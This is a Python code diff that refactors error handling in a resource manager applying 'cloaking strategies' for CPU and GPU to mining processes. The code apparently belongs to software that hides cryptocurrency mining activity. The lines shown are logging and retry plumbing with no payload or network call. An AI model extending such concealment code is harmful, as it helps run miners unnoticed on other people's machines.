@@ -280,63 +280,77 @@ class SharedResourceManager:
 
     def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
         """
-        Apply the specified cloaking strategy to a given process.
+        Apply a cloaking strategy to a given process.
 
         Args:
-            strategy_name (str): Name of the cloaking strategy (e.g., 'gpu', 'cpu').
+            strategy_name (str): Name of the cloaking strategy (e.g., 'cpu', 'gpu').
             process (MiningProcess): The process to which the strategy will be applied.
 
         Raises:
             Exception: If the strategy cannot be created or applied.
         """
         try:
+            # Log việc tạo strategy
             self.logger.debug(f"Tạo strategy '{strategy_name}' cho {process.name} (PID={process.pid})")
+
+            # Tạo chiến lược từ factory
             strategy = CloakStrategyFactory.create_strategy(
                 strategy_name,
                 self.config,
                 self.logger,
                 self.is_gpu_initialized()
             )
-            
-            # Ghi lại trạng thái của strategy
-            if strategy:
-                self.logger.debug(f"Strategy class: {strategy.__class__.__name__}, available methods: {dir(strategy)}")
-                self.logger.debug(f"Strategy.apply: {getattr(strategy, 'apply', None)}")
-            
-            # Xác minh chiến lược
+
+            # Kiểm tra chiến lược có hợp lệ không
             if not strategy:
-                raise RuntimeError(f"Failed to create strategy '{strategy_name}'. Strategy is None.")
-            if not hasattr(strategy, 'apply') or not callable(getattr(strategy, 'apply', None)):
-                self.logger.error(f"Strategy details: {dir(strategy)}")
-                raise TypeError(f"Invalid strategy: {strategy.__class__.__name__} does not implement a callable 'apply' method.")
-            
-            # Áp dụng chiến lược
+                self.logger.error(f"Failed to create strategy '{strategy_name}'. Strategy is None.")
+                return  # Không ném ngoại lệ để tránh ngắt luồng chính
+            if not callable(getattr(strategy, 'apply', None)):
+                self.logger.error(f"Invalid strategy: {strategy.__class__.__name__} does not implement a callable 'apply' method.")
+                return  # Không ném ngoại lệ để tránh ngắt luồng chính
+
+            # Log thông tin chiến lược
+            self.logger.debug(f"Strategy class: {strategy.__class__.__name__}, methods: {dir(strategy)}")
+
+            # Áp dụng chiến lược với cơ chế thử lại
             self.logger.info(f"Bắt đầu áp dụng chiến lược '{strategy_name}' cho {process.name} (PID={process.pid})")
-            adjustments = strategy.apply(process)
+            adjustments = self._safe_apply_strategy(strategy, process)
+
+            # Xử lý các điều chỉnh trả về
             if adjustments:
-                self.logger.info(
-                    f"Áp dụng '{strategy_name}' => {adjustments} cho {process.name} (PID={process.pid})."
-                )
+                self.logger.info(f"Áp dụng '{strategy_name}' => {adjustments} cho {process.name} (PID={process.pid}).")
                 self.execute_adjustments(adjustments, process)
             else:
-                self.logger.warning(
-                    f"Không có điều chỉnh nào được trả về từ strategy '{strategy_name}' cho tiến trình {process.name} (PID={process.pid})."
-                )
-        except RuntimeError as e:
-            self.logger.error(
-                f"Runtime error trong cloaking '{strategy_name}' cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
-            )
-            raise
-        except TypeError as e:
-            self.logger.error(
-                f"Type error trong cloaking '{strategy_name}' cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
-            )
-            raise
+                self.logger.warning(f"Không có điều chỉnh nào được trả về từ strategy '{strategy_name}' cho tiến trình {process.name} (PID={process.pid}).")
+
         except Exception as e:
             self.logger.error(
                 f"Lỗi không xác định khi áp dụng cloaking '{strategy_name}' cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
             )
             raise
+
+    def _safe_apply_strategy(self, strategy: CloakStrategy, process: MiningProcess) -> Optional[Dict[str, Any]]:
+        """
+        Safely apply a cloaking strategy and handle errors.
+
+        Args:
+            strategy (CloakStrategy): The cloaking strategy to apply.
+            process (MiningProcess): The process to which the strategy will be applied.
+
+        Returns:
+            Optional[Dict[str, Any]]: Adjustments returned by the strategy, or None if an error occurs.
+        """
+        try:
+            adjustments = strategy.apply(process)
+            if not isinstance(adjustments, dict):
+                self.logger.error(f"Adjustments returned by {strategy.__class__.__name__} are not a dictionary: {adjustments}")
+                return None
+            return adjustments
+        except Exception as e:
+            self.logger.error(
+                f"Lỗi khi áp dụng strategy '{strategy.__class__.__name__}' cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
+            )
+            return None
 
     def restore_resources(self, process: MiningProcess):
         try:
